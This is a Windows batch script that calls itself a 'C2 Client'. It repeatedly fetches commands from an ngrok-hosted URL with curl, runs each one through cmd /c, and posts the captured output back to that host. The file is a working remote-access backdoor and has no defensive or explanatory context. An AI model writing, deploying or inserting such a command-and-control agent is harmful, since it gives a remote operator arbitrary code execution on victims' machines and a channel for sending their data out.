@echo off
setlocal enabledelayedexpansion
set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev
set LAST_CMD=

echo [*] Starting C2 Client
echo [*] URL: %URL%

:loop
    ping -n 3 127.0.0.1 >nul
    
    rem Get command from server
    set CMD=
    for /f "usebackq delims=" %%A in (`curl -s %URL% 2^>nul`) do set CMD=%%A
    
    rem If no command, wait and try again
    if "!CMD!"=="" goto loop
    
    rem If command is "WAITING", skip it
    if "!CMD!"=="WAITING" goto loop
    
    rem CRITICAL: Don't re-run the same command
    if "!CMD!"=="!LAST_CMD!" (
        echo [*] Skipping duplicate: !CMD!
        goto loop
    )
    
    set LAST_CMD=!CMD!
    
    echo [*] Executing: !CMD!
    
    rem Execute command and capture output
    set TEMPFILE=%TEMP%\c2_output.txt
    cmd /c "!CMD!" > "!TEMPFILE!" 2>&1
    
    rem Send output back as ONE request
    if exist "!TEMPFILE!" (
        curl -X POST --data-binary @"!TEMPFILE!" %URL% 2>nul
        del "!TEMPFILE!" 2>nul
    ) else (
        curl -X POST -d "Command executed with no output" %URL% 2>nul
    )
    
    rem Clear command so we don't accidentally re-use it
    set CMD=
    
    rem Wait for server to process before requesting next command
    timeout /t 2 /nobreak >nul
    
goto loop
